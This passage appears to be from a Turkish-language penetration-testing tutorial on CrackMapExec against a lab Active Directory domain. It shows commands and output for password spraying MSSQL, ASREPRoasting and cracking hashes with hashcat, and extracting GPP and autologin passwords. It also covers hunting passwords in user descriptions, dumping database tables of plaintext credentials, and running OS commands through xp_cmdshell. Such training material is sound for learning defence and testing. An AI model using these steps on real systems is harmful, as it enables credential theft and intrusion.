MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:inlanefreight.htb)
MSSQL 10.129.203.121 1433 DC01 [-]
ERROR(DC01\SQLEXPRESS): Line 1: Login failed. The login is from an
untrusted domain and cannot be used with Integrated authentication.
MSSQL 10.129.203.121 1433 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!

```

Lokal bir Windows Hesabı için, domain seçeneği `-d` veya hedef makine adı olarak bir nokta (`.`) belirtmemiz gerekir:

### Password Spray - Local Windows Account

```
crackmapexec mssql 10.129.203.121 -u julio grace -p Inlanefreight01! -d .

MSSQL 10.129.203.121 1433 None [*] None
(name:10.129.203.121) (domain:.)
MSSQL 10.129.203.121 1433 None [-]
ERROR(DC01\SQLEXPRESS): Line 1: Login failed. The login is from an
untrusted domain and cannot be used with Integrated authentication.
MSSQL 10.129.203.121 1433 None [+]
.\grace:Inlanefreight01!

```

Not: Bu bir Domain Controller olduğundan, Windows local hesapları kullanılmamıştır. Bu örnek, local windows hesapları ile Domain Controller olmayan bir makine hedeflendiğinde geçerli olacaktır.

Genellikle administrators, local kullanım veya test için Active Directory hesaplarıyla aynı isimde hesaplar oluşturabilirler. Active Directory hesabı ile aynı ad ve parola ile oluşturulmuş MSSQL hesapları bulabiliriz. Parolanın yeniden kullanımı çok yaygındır! Bir SQL Hesabı denemek istiyorsak, `--local-auth` bayrağını belirtmemiz gerekir:


### Password Spray - SQL Account

```
crackmapexec mssql 10.129.203.121 -u julio grace -p Inlanefreight01! --
local-auth

MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:DC01)
MSSQL 10.129.203.121 1433 DC01 [-]
ERROR(DC01\SQLEXPRESS): Line 1: Login failed for user 'julio'.
MSSQL 10.129.203.121 1433 DC01 [+]
grace:Inlanefreight01!
```

Gördüğümüz gibi, grace hesabı aynı parola ile MSSQL veritabanında local olarak mevcuttur.

### Other Protocols

Unutmayın ki, bazen bir kullanıcı administrator olmayabilir, ancak RDP, SSH, FTP gibi diğer protokollere erişim yetkisine sahip olabilir. Bu, Password Spraying yaparken hedefi anlamanın ve olabildiğince çok protokole saldırı yapmanın önemli olduğu bir durumdur.

Not: Active Directory kimlik doğrulaması kullanarak Password Spray yaparken, başarısız şifre deneme sayısı tüm protokoller için aynı olacaktır. Örneğin, eğer kilitlenme sınırı beş deneme ise ve biz üç şifreyi RDP üzerinden, iki şifreyi ise WinRM karşısında denersek, toplamda 5'e ulaşılacak ve hesabın kilitlenmesine sebep olacağız.


### Next Steps

Bu bölümde, geçerli kimlik bilgilerini belirlemeye ve domain'e erişim sağlamaya çalışmak için bir kullanıcı listesi kullanarak farklı protokollere karşı Password Spraying'in nasıl gerçekleştirileceğini öğrendik. Bir sonraki bölümde, `brute forcing` veya `Password` `Spray` olmadan hesapları tanımlamak için diğer mekanizmalar tartışılacaktır.


### Finding ASREPRoastable Accounts

ASREPRoast saldırısı, Kerberos `pre-authentication (ön kimlik doğrulaması)` gerekmeyen kullanıcıları arar. Bu, herhangi birinin bu kullanıcılardan herhangi biri adına KDC'ye bir `AS_REQ` isteği gönderebileceği ve bir `AS_REP` mesajı alabileceği anlamına gelir. Bu son tür mesaj, şifresinden türetilen orijinal `user anahtarıyla` şifrelenmiş bir veri parçası içerir. Daha sonra, bu mesaj kullanılarak, kullanıcı nispeten zayıf bir parola seçtiyse, kullanıcı parolası `çevrimdışı` olarak kırılabilir. 

Domain üzerinde bir hesabımız yoksa ancak bir kullanıcı adı listemiz varsa, belki şansımız yaver gider ve Kerberos pre-authentication gerektirmeyen seçeneğe sahip bir hesap bulabiliriz. Bu seçenek ayarlanmışsa, kullanıcının şifresiyle çözülebilen şifrelenmiş verileri bulmamızı sağlar.

Daha önce `--asreproast` seçeneği ile bulduğumuz kullanıcı listesi ile LDAP protokolünü kullanabilir ve ardından bir dosya adı ve DC'nin FQDN'sini hedef olarak belirtebiliriz. Bu saldırıya karşı savunmasız en az bir hesap olup olmadığını belirlemek için `users.txt` dosyasının içindeki her hesabı arayacağız:

### ASREPRoast için Bruteforcing Hesapları

```
crackmapexec ldap dc01.inlanefreight.htb -u users.txt -p '' --asreproast
asreproast.out

SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 445 DC01 [email
protected]:1674ae058d5280dbc25ee678ee938c71$7277ce57387d449dd80c5e9d9a9b94
0a91e1f720e506ce910d7b48ad9faa97d10e32dc265101ad14b097e5755108278a4f32bb62
3d716478a600c5301e03db8e97165b0d0229155cef2a34d40f57841c0a7a1a0d0fed693b23
1e81940d70f127d20af8e6a1e813d663484c3073ed8ba8f2e117f15f8def6ebda88fc45baf
59a6fbee01d87dce18051b9159e38a2869a5fdffa0ccffde4ac5ae45a75f978ac958f0d23b
2e36fa05cbfe13f38ca7ea4311e859d85b1c29e4ce226c72c09e25127a96a18f7afc8d2c73
67a2dc14d61954b9e63812f5787e3ce5e2dc403674549e0bb18e76f758b4c04ad46ff34945
9fcb777b78d50fb876
```

Listemize dayanarak, ASREPRoasting'e karşı savunmasız bir hesap bulduk. `Geçerli kimlik bilgilerimiz varsa`  Kerberos pre-authentication gerektirmeyen tüm hesapları talep edebiliriz. ASREPRoast'a karşı savunmasız tüm hesapları istemek için Grace'in kimlik bilgilerini kullanalım.


### Search for ASREPRoast Accounts

```
crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! --
asreproast asreproast.out

SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 389 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
LDAP dc01.inlanefreight.htb 389 DC01 [*] Total of
records returned 6
LDAP dc01.inlanefreight.htb 389 DC01 [email
protected]:5567a4d9df8894497ce50c74c15cbe74$ea2eeece92c1314848071449c4061f
1c8e0153a5e91deaec56a1009b33aa4aa8fd86f9a17d8012629ee31aa525eeb98c1a9fc873
f1db27935f79d6fe8a9edc43116afcfdc161d1f90e48baf5d25691f418254ffe9e68c9ff36
ded80b81e165a61fc3867202fcd0e5279d45509024e728e792a1dede3deedb522028d4c76d
b8f7f819775136c350727d83f00cc9ddddcb1df1813cc7a4c299352af22d61a746bb84c6c9
de8e501ed35e630a424fb560349d827b23658081c1bab64e7a208eab6af974d972ad8f445f
b3cbb55a0d294429a5be20472e92963c4ebd7e39ad49cd47661d6d3b7045a3200454b6deb6
e88fcdac3d0a81326c
LDAP dc01.inlanefreight.htb 389 DC01 [email
protected]:be96a4ea9e79a3f21c2984fc8b75d1f6$34c5bd1641d4588248348b6b91713d
45f60f37c5153369101af2b4294906c729a516fdea8c474f5e470d4d465bfa5d43dbbfe8e4
5cc1f1d12b0802796af3dd629f5be07282c9024be029ffb1c6243f0139a943b89952833a7a
7794ac77372dc107fbd14cd6ebe084a6c3123651d75ddd46a7406d68a8711e8e11257cfdda
71e0c13c8f5a9852afb0a0b9e3acc8856655987d3725f495e15ee56fb94f10df0a247d04ef
967b252000782b8debb410cb7a4f60a2704b3aa8a3ed3d444d2b6d2e96bb93086bb64407a1
cd4b240cb41955b446753795e2855f54d11d49360a5998df52a9a92f761477e66fc01972cb
46b818a680c7f97854
```

Tüm hash'leri aldıktan sonra, `18200` modülü ile `Hashcat`'i kullanabilir ve bunları kırmayı deneyebiliriz. `rockyou.txt` kelime listesini kullanalım ve bu hash'leri kırmaya çalışalım:


### Password Cracking

```
hashcat -m 18200 asreproast.out /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...
<SNIP>
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344386
* Bytes.....: 139921355
* Keyspace..: 14344386
[email
protected]:40d78fb0fd99b5070f8e519670e72f01$728671cd74bfb9b009f4e4dc7b5206
e4f45c3497b1e097fb47d9ddcee8211928d857cd8d11e6c7b9e4ced73806974a8db226c3cf
b14962cab03f7c6d85c5670ecbcf513d99d28f1e6445de81c7ee3c29641eb633457ed7b53d
40deba514a2e06d08759111628afd9b91a683622b6fed872d85f6a2e083237d4bb8d3ac43d
dd4fb7198389969bcc6282066fd34fcf06945806679e5eccc215a7034ac88bb2f2f068a4fb
176bcc3a48396cdf152614ec8a634bac8745e18e23d135afef234def28c53a74e930c315c8
666de1d63165317c7454460af3bf711a5c3006f498d2a1ee532cf537b97a991a2dc71d6de9
5ae8ca64c2c7cd8301:Password!
<SNIP>
```

Domain üzerinde geçerli bir hesap bulmanın başka bir yolunu bulduk, bu da ortam hakkında çok daha fazla bilgi toplamamızı ve belki de hosts veya diğer kullanıcıları tehlikeye atmaya başlamamızı sağlayacaktı

----

### Group Policy Objelerinde Hesapları Arama

Bir hesabın kontrolünü ele geçirdiğimizde, gerçekleştirmemiz gereken bazı zorunlu kontroller vardır. `Group Policy Objects'de (GPO)` yazılı kimlik bilgilerini aramak, özellikle eski bir ortamda (Windows server 2003 / 2008) işe yarayabilir, çünkü her domain kullanıcısı `GPO`'ları okuyabilir.

CrackMapExec, tüm GPO'ları arayacak ve ilginç kimlik bilgilerini bulacak iki modüle sahiptir. `gpp_password` ve `gpp_autologin` modüllerini kullanabiliriz. İlk modül olan gpp_password, `Group Policy Preferences (GPP)` aracılığıyla gönderilen hesaplar için düz metin parolasını ve diğer bilgileri alır. Bu saldırı hakkında daha fazla bilgiyi [Password Discovery and Group Policy Preference Abuse in SYSVOL blog](https://adsecurity.org/?p=2288) yazısında okuyabilirsiniz. İkinci modül olan `gpp_autologin`, `autologin` bilgilerini bulmak için Domain Controller'daki `registry.xml` dosyalarını arar ve varsa kullanıcı adını ve açık metin parolasını döndürür.

### Password GPP

```
crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! -M
gpp_password
SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
GPP_PASS... 10.129.203.121 445 DC01 [+] Found SYSVOL share
GPP_PASS... 10.129.203.121 445 DC01 [*] Searching for
potential XML files containing passwords
GPP_PASS... 10.129.203.121 445 DC01 [*] Found
inlanefreight.htb/Policies/{31B2F340-016D-11D2-945F00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
GPP_PASS... 10.129.203.121 445 DC01 [+] Found credentials
in inlanefreight.htb/Policies/{31B2F340-016D-11D2-945F00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
GPP_PASS... 10.129.203.121 445 DC01 Password:
Inlanefreight1998!
GPP_PASS... 10.129.203.121 445 DC01 action: U
GPP_PASS... 10.129.203.121 445 DC01 newName:
GPP_PASS... 10.129.203.121 445 DC01 fullName:
GPP_PASS... 10.129.203.121 445 DC01 description:
GPP_PASS... 10.129.203.121 445 DC01 changeLogon: 0
GPP_PASS... 10.129.203.121 445 DC01 noChange: 1
GPP_PASS... 10.129.203.121 445 DC01 neverExpires: 1
GPP_PASS... 10.129.203.121 445 DC01 acctDisabled: 0
GPP_PASS... 10.129.203.121 445 DC01 userName:
inlanefreight.htb\engels
```


### AutoLogin GPP

```
crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! -M
gpp_autologin
SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
GPP_AUTO... 10.129.203.121 445 DC01 [+] Found SYSVOL share
GPP_AUTO... 10.129.203.121 445 DC01 [*] Searching for
Registry.xml
GPP_AUTO... 10.129.203.121 445 DC01 [*] Found
inlanefreight.htb/Policies/{C17DD5D1-0D41-4AE9-B393-
ADF5B3DD208D}/Machine/Preferences/Registry/Registry.xml
GPP_AUTO... 10.129.203.121 445 DC01 [+] Found credentials
in inlanefreight.htb/Policies/{C17DD5D1-0D41-4AE9-B393-
ADF5B3DD208D}/Machine/Preferences/Registry/Registry.xml
GPP_AUTO... 10.129.203.121 445 DC01 Usernames: ['kiosko']
GPP_AUTO... 10.129.203.121 445 DC01 Domains:
['INLANEFREIGHT']
GPP_AUTO... 10.129.203.121 445 DC01 Passwords:
['SimplePassword123!']
```

Bizim durumumuzda, iki farklı parolaya sahip iki hesap bulduk. Bu hesapların hala geçerli olup olmadığını kontrol edelim:

### Credentials Validation

```
crackmapexec smb 10.129.203.121 -u engels -p Inlanefreight1998! SMB 

10.129.203.121 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False) SMB 10.129.203.121 445 DC01 [+] inlanefreight.htb\engels:Inlanefreight1998!
```

```
crackmapexec smb 10.129.203.121 -u kiosko -p SimplePassword123! SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False) SMB 10.129.203.121 445 DC01 [+] inlanefreight.htb\kiosko:SimplePassword123!
```

Her iki hesap da hala geçerlidir ve bunları domain'de kimlik doğrulaması yapmak için kullanabilir, hangi ayrıcalıklara sahip olduklarını belirleyebilir veya bu kimlik bilgilerini yeniden kullanmayı deneyebiliriz

Bu bölüm bize kimlik bilgilerini elde etmek için GPO yapılandırmalarını kötüye kullanmanın birkaç yöntemini öğretti. Bir sonraki bölümde, kimliği doğrulanmış bir kullanıcı olarak daha fazla bilgi toplamanın yollarını tartışmaya devam edeceğiz

### Modüllerle Çalışma

Daha önce tartıştığımız gibi, her CrackMapExec protokolü modülleri destekler. Belirtilen protokol için mevcut modülleri görüntülemek için `crackmapexec protocol -L` komutunu çalıştırabiliriz. Örnek olarak LDAP protokolünü kullanalım.

### LDAP için Mevcut Modülleri Görüntüle

```
crackmapexec ldap -L

[*] MAQ Retrieves the MachineAccountQuota domainlevel attribute
[*] adcs Find PKI Enrollment Services in Active
Directory and Certificate Templates Names
[*] daclread Read and backup the Discretionary Access
Control List of objects. Based on the work of @_nwodtuhs and @BlWasp_. Be
carefull, this module cannot read the DACLS recursively, more explains in
the options.
[*] get-desc-users Get description of the users. May contained
password
[*] get-network
[*] laps Retrieves the LAPS passwords
[*] ldap-checker Checks whether LDAP signing and binding are
required and / or enforced
[*] ldap-signing Check whether LDAP signing is required
[*] subnets Retrieves the different Sites and Subnets of
an Active Directory
[*] user-desc Get user descriptions stored in Active
Directory
[*] whoami Get details of provided user
```

`User-desc` modülünü seçelim ve modüllerle nasıl etkileşime girebileceğimizi görelim

Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi `/etc/hosts` dosyasında yapılandırmamız gerekir. Hedef IP'yi FQDN `dc01.inlanefreight.htb` olarak yapılandırın.


### Modüllerde Seçeneklerin Tanımlanması

Bir CrackMapExec modülü, bazı özel değerler ayarlamak için farklı seçeneklere sahip olabilir. MAQ gibi seçeneklere sahip olmayan modüller olabilir, bu da varsayılan eylemlerini değiştiremeyeceğimiz anlamına gelir. Bir modülün desteklenen seçeneklerini görüntülemek için aşağıdaki sözdizimini kullanabiliriz:  
`crackmapexec <protokol> -M <modül_adı> --options`


### LDAP MAQ Modülü için Seçenekleri Görüntüle

```
crackmapexec ldap -M MAQ --options
[*] MAQ module options:
None
```

### LDAP user-desc Modülü için Seçenekleri Görüntüle

```
crackmapexec ldap -M user-desc --options
[*] user-desc module options:
 LDAP_FILTER Custom LDAP search filter (fully replaces the
default search)
 DESC_FILTER An additional seach filter for descriptions
(supports wildcard *)
 DESC_INVERT An additional seach filter for descriptions (shows
non matching)
 USER_FILTER An additional seach filter for usernames (supports
wildcard *)
 USER_INVERT An additional seach filter for usernames (shows
non matching)
 KEYWORDS Use a custom set of keywords (comma separated)
 ADD_KEYWORDS Add additional keywords to the default set (comma
separated)

```

LDAP modülü olan **`user-desc`**, Active Directory domainindeki tüm kullanıcıları sorgular ve açıklamalarını alır. Varsayılan anahtar kelimelerle eşleşen kullanıcı açıklamalarını yalnızca görüntüler, ancak tüm açıklamaları bir dosyaya kaydeder.

Varsayılan anahtar kelimeler açıklamada sağlanmaz. Bu anahtar kelimelerin ne olduğunu öğrenmek istiyorsak, kaynak koda bakmamız gerekir. Kaynak kodunu **`CrackMapExec/cme/modules/`** dizininde bulabiliriz. Ardından modül adını arayabilir ve açabiliriz. Bizim durumumuzda, **`user-desc`** modülünü içeren Python script'i **`user_description.py`**'dir. Dosyayı **grep** komutuyla arayarak **keywords** kelimesini bulalım:


### user-desc Modülünün Kaynak Koduna Bakmak

```
cat CrackMapExec/cme/modules/user_description.py |grep keywords
 KEYWORDS Use a custom set of keywords (comma separated)
 ADD_KEYWORDS Add additional keywords to the default set (comma
separated)
 self.keywords = {'pass', 'creds', 'creden', 'key', 'secret',
'default'}
 ...SNIP...
```


Modülü kullanalım ve ilginç kullanıcı açıklamalarını bulalım:

### user-desc Modülünü Kullanarak Kullanıcı Açıklamasını Alma

```
crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! -M
user-desc
SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 389 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
USER-DES... User: krbtgt -
Description: Key Distribution Center Service Account
USER-DES... User: alina -
Description: Account for testing HR App. Password: HRApp123!
USER-DES... Saved 6 user
descriptions to /home/plaintext/.cme/logs/UserDesc-10.129.203.121-
20221031_120444.log
```

Gördüğümüz gibi, `key` ve `pass` anahtar kelimelerini içeren açıklamayı görüntüler, ancak tüm açıklamalar log dosyasına kaydedilir


### Dosyayı Tüm Açıklamalarla Açma

```
cat /home/plaintext/.cme/logs/UserDesc-10.129.203.121-20221031_120444.log

User: Description:
Administrator Built-in account for administering the
computer/domain
Guest Built-in account for guest access to the
computer/domain
krbtgt Key Distribution Center Service Account
alina Account for testing HR App. Password: HRApp123!
engels Service Account for testing
testaccount pwd: Testing123!
```



### Seçeneklerle Bir Modül Kullanma

Eğer bir modül seçeneği kullanmak istiyorsak `-o` bayrağını kullanmamız gerekir. Tüm seçenekler `KEY=value` şeklinde belirtilir (msfvenom stili). Aşağıdaki örnekte, varsayılan anahtar kelimeleri ve ekran değerlerini `pwd` ve `admin` anahtar kelimeleriyle değiştireceğiz.

### Yeni Anahtar Kelimelerle user-desc Kullanma

```
crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! -M user-desc -o KEYWORDS=pwd,admin
SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 389 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
USER-DES... User:
Administrator - Description: Built-in account for administering the
computer/domain
USER-DES... User:
testaccount - Description: pwd: Testing123!
USER-DES... Saved 6 user
descriptions to /home/plaintext/.cme/logs/UserDesc-10.129.203.121-
20221031_123727.log
```


### Kullanıcı Üyeliğini Sorgulama

`groupmembership`, bir kullanıcının ait olduğu grupları sorgulamamızı sağlayan bir başka modül örneğidir (kendi modüllerinizi nasıl oluşturacağınızı daha sonra tartışacağız). Kullanmak için `USER` seçeneği ile sorgulamak istediğimiz kullanıcıyı belirtmemiz gerekiyor.

Bu eğitimin yazıldığı sırada bu modül için bir [PR](https://github.com/byt3bl33d3r/CrackMapExec/pull/696) var, ancak indirilir ve onaylanana kadar modüller klasörüne yerleştirilirse kullanılabilir.


### Özel Modül ile Grup Üyeliğini Sorgulama

```
cd CrackMapExec/cme/modules/

wget https://raw.githubusercontent.com/PorchettaIndustries/CrackMapExec/7d1e0fdaaf94b706155699223f984b6f9853fae4/cme/modul
es/groupmembership.py -q

crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! -M groupmembership -o USER=julio

SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 389 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
GROUPMEM... dc01.inlanefreight.htb 389 DC01 [+] User:
julio is member of following groups:
GROUPMEM... dc01.inlanefreight.htb 389 DC01 Server
Operators
GROUPMEM... dc01.inlanefreight.htb 389 DC01 Domain Admins
GROUPMEM... dc01.inlanefreight.htb 389 DC01 Domain Users

```


---

### MSSQL Enumeration and Attacks

Bir MSSQL sunucusu bulmak çok ilginçtir çünkü veritabanları genellikle saldırı operasyonlarımızı ilerletmek ve daha fazla erişim elde etmek için kullanabileceğimiz bilgiler içerir. Değerlendirmemizin amacı olan hassas verilere de erişim elde edebiliriz. Ayrıca, [xp_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16) özelliğini kullanarak bir MSSQL veritabanı üzerinden işletim sistemi komutlarını çalıştırabiliriz.

Password Spray bölümünde tartıştığımız gibi, SQL'e üç farklı türde kullanıcı hesabı ile kimlik doğrulaması yapabiliriz. Veritabanı üzerinde hangi yetkilere sahip olduğumuzu ve hangi veritabanına erişimimiz olduğunu göz önünde bulundurmak ve veritabanı dba (veritabanı yöneticisi) kullanıcısı olup olmadığımızı doğrulamak da önemlidir.

Veritabanlarıyla çalışırken genellikle iki işlem gerçekleştiririz:

* SQL Sorgularını Yürütme
* Windows Komutlarını Yürütme

### SQL Sorgularını Yürütme

SQL sorgusu veritabanı ile etkileşim kurmamızı sağlar. Bilgi alabilir veya veritabanı tablolarına veri ekleyebiliriz. Ayrıca veritabanının yönetim ve administration farklı operasyonel işlevlerini de kullanabiliriz. Bir hesap aldıktan sonra, -q seçeneğini kullanarak bir SQL sorgusu gerçekleştirebiliriz.


### Tüm Veritabanı Adlarını Almak için SQL Sorgusu

```
crackmapexec mssql 10.129.203.121 -u grace -p Inlanefreight01! -q "SELECT name FROM master.dbo.sysdatabases"
MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:inlanefreight.htb)
MSSQL 10.129.203.121 1433 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
MSSQL 10.129.203.121 1433 DC01 name
MSSQL 10.129.203.121 1433 DC01 ----------------------
--------------------------------------------------------------------------
--------------------------------
MSSQL 10.129.203.121 1433 DC01 master
MSSQL 10.129.203.121 1433 DC01 tempdb
MSSQL 10.129.203.121 1433 DC01 model
MSSQL 10.129.203.121 1433 DC01 msdb
MSSQL 10.129.203.121 1433 DC01 core_app
MSSQL 10.129.203.121 1433 DC01 core_business

```

Bir MSSQL kullanıcısı belirtmek için `--local-auth` seçeneğini de kullanabiliriz. Bu seçeneği seçmezsek, bunun yerine bir domain hesabı kullanılacaktır.


### SQL Queries

```
crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! - localauth -q "SELECT name FROM master.dbo.sysdatabases"

MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:DC01)
MSSQL 10.129.203.121 1433 DC01 [+]
nicole:Inlanefreight02! (Pwn3d!)
MSSQL 10.129.203.121 1433 DC01 name
MSSQL 10.129.203.121 1433 DC01 ----------------------
--------------------------------------------------------------------------
--------------------------------
MSSQL 10.129.203.121 1433 DC01 master
MSSQL 10.129.203.121 1433 DC01 tempdb
MSSQL 10.129.203.121 1433 DC01 model
MSSQL 10.129.203.121 1433 DC01 msdb
MSSQL 10.129.203.121 1433 DC01 core_app
MSSQL 10.129.203.121 1433 DC01 core_business

```

```
crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! - localauth -q "SELECT table_name from core_app.INFORMATION_SCHEMA.TABLES"

MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:DC01)
MSSQL 10.129.203.121 1433 DC01 [+]
nicole:Inlanefreight02! (Pwn3d!)
MSSQL 10.129.203.121 1433 DC01 table_name
MSSQL 10.129.203.121 1433 DC01 ----------------------
--------------------------------------------------------------------------
--------------------------------
MSSQL 10.129.203.121 1433 DC01 tbl_users
```

```
crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --localauth -q "SELECT * from [core_app].[dbo].tbl_users"
MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:DC01)
MSSQL 10.129.203.121 1433 DC01 [+]
nicole:Inlanefreight02! (Pwn3d!)
MSSQL 10.129.203.121 1433 DC01 id_user
MSSQL 10.129.203.121 1433 DC01 name
MSSQL 10.129.203.121 1433 DC01 lastname
MSSQL 10.129.203.121 1433 DC01 username
MSSQL 10.129.203.121 1433 DC01 password
MSSQL 10.129.203.121 1433 DC01 -----------
MSSQL 10.129.203.121 1433 DC01 ----------------------
----------------------------
MSSQL 10.129.203.121 1433 DC01 ----------------------
----------------------------
MSSQL 10.129.203.121 1433 DC01 ----------------------
----------------------------
MSSQL 10.129.203.121 1433 DC01 ----------------------
----------------------------
MSSQL 10.129.203.121 1433 DC01 1
MSSQL 10.129.203.121 1433 DC01 b'Josh'
MSSQL 10.129.203.121 1433 DC01 b'Matt'
MSSQL 10.129.203.121 1433 DC01 b'josematt'
MSSQL 10.129.203.121 1433 DC01 b'Testing123'
MSSQL 10.129.203.121 1433 DC01 2
MSSQL 10.129.203.121 1433 DC01 b'Elie'
MSSQL 10.129.203.121 1433 DC01 b'Cart'
MSSQL 10.129.203.121 1433 DC01 b'eliecart'
MSSQL 10.129.203.121 1433 DC01 b'Motor999'
```


Veritabanlarını, tabloları ve içeriği listelemek için bazı veritabanı sorguları gerçekleştirdik. 

### Windows Komutlarını Yürütme

Bir hesap bulduğumuzda, CrackMapExec otomatik olarak kullanıcının bir DBA  (Database Administrator) hesabı olup olmadığını kontrol edecektir. Çıktıyı fark edersek `Pwn3d!` , kullanıcı bir Database Administrator'dür. DBA ayrıcalıklarına sahip kullanıcılar bir veritabanı objesine erişebilir, değiştirebilir veya silebilir ve diğer kullanıcılara haklar verebilir. Bu kullanıcı veritabanına karşı herhangi bir eylem gerçekleştirebilir.


### DBA Hesabı ile Kimlik Doğrulama

```
crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --localauth

MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:DC01)
MSSQL 10.129.203.121 1433 DC01 [+]
nicole:Inlanefreight02! (Pwn3d!)
```

MSSQL, SQL kullanarak sistem komutlarını yürütmemizi sağlayan [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) adlı bir [extended stored procedure](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15)'e sahiptir. Bir DBA hesabı, Windows işletim sistemi komutlarını yürütmek için gereken özellikleri etkinleştirme ayrıcalıklarına sahiptir.

Bir Windows komutunu çalıştırmak için `-x` seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir:


### Executing Windows Commands

```
crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --localauth -x whoami

MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:DC01)
MSSQL 10.129.203.121 1433 DC01 [+]
nicole:Inlanefreight02! (Pwn3d!)
MSSQL 10.129.203.121 1433 DC01 [+] Executed command
via mssqlexec
MSSQL 10.129.203.121 1433 DC01 ----------------------
----------------------------------------------------------
MSSQL 10.129.203.121 1433 DC01
inlanefreight\svc_mssql
```

Not: MSSQL aracılığıyla Windows komutlarını çalıştırabilmek, Windows makinesinde `local administrator` olduğumuz anlamına gelmez. Ayrıcalıklarımızı yükseltebilir veya hedef makine hakkında daha fazla bilgi almak için bu erişimi kullanabiliriz.


### MSSQL ile Dosya Aktarma

MSSQL, sırasıyla [OPENROWSET (Transact-SQL)](https://learn.microsoft.com/en-us/sql/t-sql/functions/openrowset-transact-sql) ve [Ole Automation Procedures Sunucu Yapılandırma Seçeneklerini](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option) kullanarak dosyaları indirmemize ve yüklememize izin verir. CrackMapExec bu seçenekleri -`-put-file` ve -`-get-file` ile birleştirir.

Hedef makinemize bir dosya yüklemek için `--put-file` seçeneğini ve ardından yüklemek istediğimiz local dosyayı ve hedef dizini kullanabiliriz


### Upload File (Dosya Yükle)

```
crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --localauth --put-file /etc/passwd C:/Users/Public/passwd

MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:DC01)
MSSQL 10.129.203.121 1433 DC01 [+]
nicole:Inlanefreight02! (Pwn3d!)
MSSQL 10.129.203.121 1433 DC01 [*] Copy /etc/passwd
to C:/Users/Public/passwd
MSSQL 10.129.203.121 1433 DC01 [*] Size is 3456 bytes
MSSQL 10.129.203.121 1433 DC01 [+] File has been
uploaded on the remote machine
```

```
crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --localauth -x "dir c:\Users\Public"

MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:DC01)
MSSQL 10.129.203.121 1433 DC01 [+]
nicole:Inlanefreight02! (Pwn3d!)
